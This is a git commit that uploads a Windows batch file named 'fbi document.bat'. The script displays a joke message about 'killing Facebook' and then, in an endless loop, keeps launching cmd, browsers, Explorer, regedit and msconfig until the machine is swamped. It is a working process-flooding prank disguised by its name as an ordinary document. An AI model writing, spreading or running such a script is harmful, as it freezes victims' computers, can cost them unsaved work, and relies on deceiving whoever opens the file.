a573018e89846a252719fd4b347e51cab75b268d
cvm01 <107966772+cvm01@users.noreply.github.com>
2022-06-21 20:03:42 -0400

    Add files via upload

---
+++ fbi document.bat
@@ -0,0 +1,12 @@
+@echo off
+:a
+title Facebook killer
+msg * YOU HAVE KILLED FACEBOOK, HAVE ALL THE WII POINTS
+start
+start chrome.exe
+start calc.exe
+start explorer.exe
+start iexplore.exe 
+start regedit.exe
+start msconfig.exe
+goto a
